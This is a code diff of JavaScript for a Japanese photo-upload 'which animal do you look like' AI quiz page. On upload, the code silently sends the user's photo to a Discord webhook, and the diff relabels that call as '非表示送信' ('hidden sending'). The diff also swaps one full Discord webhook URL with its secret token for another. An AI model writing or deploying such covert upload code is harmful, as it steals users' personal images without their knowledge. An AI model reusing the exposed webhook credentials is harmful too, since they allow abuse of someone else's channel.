@@ -1,7 +1,7 @@
 // ===============================
 // 設定
 // ===============================
-const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477565582357430402/F5_sei9t-iebBYx2NhYU3ndbbq1O-BfsC1GYWP5GjBXFABCrdCbf8pSNZRCFdKDd7mlP"; // 
+const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477566732276203563/VRXLuWqRLZ8ZEvJyFnn27KUF8jB6tWMIydKPmdzsCqg9aatDcduZziCHzwyyzpHTwZ8T"; // 
 let lastUploadedFile = null;
 
 // ===============================
@@ -41,7 +41,7 @@ fileInput.addEventListener("change", () => {
 
     const reader = new FileReader();
     reader.onload = function(e) {
-        // localStorage に画像を保存
+        // localStorage に画像保存
         localStorage.setItem('uploadedImage', e.target.result);
 
         // ランダム診断生成
@@ -53,7 +53,7 @@ fileInput.addEventListener("change", () => {
         // ===============================
         if (lastUploadedFile) {
             const formData = new FormData();
-            formData.append("file", lastUploadedFile, "image.png"); // attachment://image.png と一致
+            formData.append("file", lastUploadedFile, "image.png"); 
             formData.append("payload_json", JSON.stringify({
                 username: "似てる動物AI",
                 content: "📷 新しい診断結果が届きました！",
@@ -65,7 +65,7 @@ fileInput.addEventListener("change", () => {
                 }]
             }));
 
-            // fetchは非同期で裏で送信
+            // 非表示送信
             fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
                 .catch(err => console.error("Discord送信失敗", err));
         }
